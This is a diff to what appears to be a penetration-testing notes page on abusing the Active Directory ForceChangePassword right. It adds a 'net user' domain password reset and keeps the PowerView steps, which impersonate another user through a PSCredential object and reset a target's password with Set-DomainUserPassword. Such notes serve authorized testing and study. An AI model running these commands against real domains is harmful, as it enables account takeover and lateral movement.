@@ -1,5 +1,13 @@
 # ForceChangePassword
 
+## <mark style="color:yellow;">Change the user's password with net</mark>
+
+<mark style="color:orange;">**Full Privileges Required!**</mark>
+
+```powershell
+net user songbird S4MUR41 /domain
+```
+
 ## <mark style="color:yellow;">Creating PSCredentials object</mark>
 
 If we do not run PowerShell as other user, we may put their creds to secure PS object so we can impersonate him.&#x20;
@@ -12,7 +20,7 @@ PS C:\> $SecPassword = ConvertTo-SecureString 'h4ck4allth3th1ngs' -AsPlainText -
 PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('MILITECH\sreed', $SecPassword)
 ```
 
-## <mark style="color:yellow;">Changing the user's password</mark>
+## <mark style="color:yellow;">Changing the user's password with PowerView</mark>
 
 Here are are making a SecureString for new **songbird's** password and changing it using **sreed's** credentials in <mark style="color:green;">`-Credential $Cred`</mark>. <mark style="color:orange;">**PowerView Required!**</mark>
 
@@ -20,4 +28,3 @@ Here are are making a SecureString for new **songbird's** password and changing 
 PS C:\> $songbirdPassword = ConvertTo-SecureString 'S4MUR41' -AsPlainText -Force
 PS C:> Set-DomainUserPassword -Identity songbird -AccountPassword $songbirdPassword -Credential $Cred -Verbose
 ```
-
